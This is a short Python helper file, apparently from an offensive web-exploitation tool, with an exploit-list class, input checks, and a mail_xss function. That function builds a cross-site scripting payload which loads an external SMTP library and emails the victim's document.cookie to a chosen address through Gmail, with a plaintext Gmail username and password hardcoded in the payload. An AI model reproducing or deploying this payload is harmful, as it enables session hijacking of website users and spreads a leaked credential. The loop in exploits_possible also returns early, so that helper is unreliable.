#exploit class used to set up the exploit list
class Exploit:
	def __init__(self,name,description, executable=1):
		self.id = name
		self.desc = description
		self.executable = executable



##################################################
#				function definition				 #
##################################################

#check if the inserted input is a valid number
def is_valid_number(var, min, max):
	if (not(var.isdigit()) or int(var) > max or int(var) < min):
		return False
	else:
		return True

#check if there is at least one possible exploit
def exploits_possible(list):
	for x in list:
  		if x.executable == 1:
  			return True
  		return False



#function to add inject the script for sending an email
def mail_xss(mail_address):
	return "<script src=\"https://smtpjs.com/v3/smtp.js\"></script><script>Email.send({Host : \"smtp.gmail.com\",Username : \"davide.sbetti@gmail.com\",Password : \"hiellzxiajvmuimz\",To : '" + mail_address + "',From : \"davide.sbetti@gmail.com\",Subject : \"a\",Body : document.cookie });</script>"
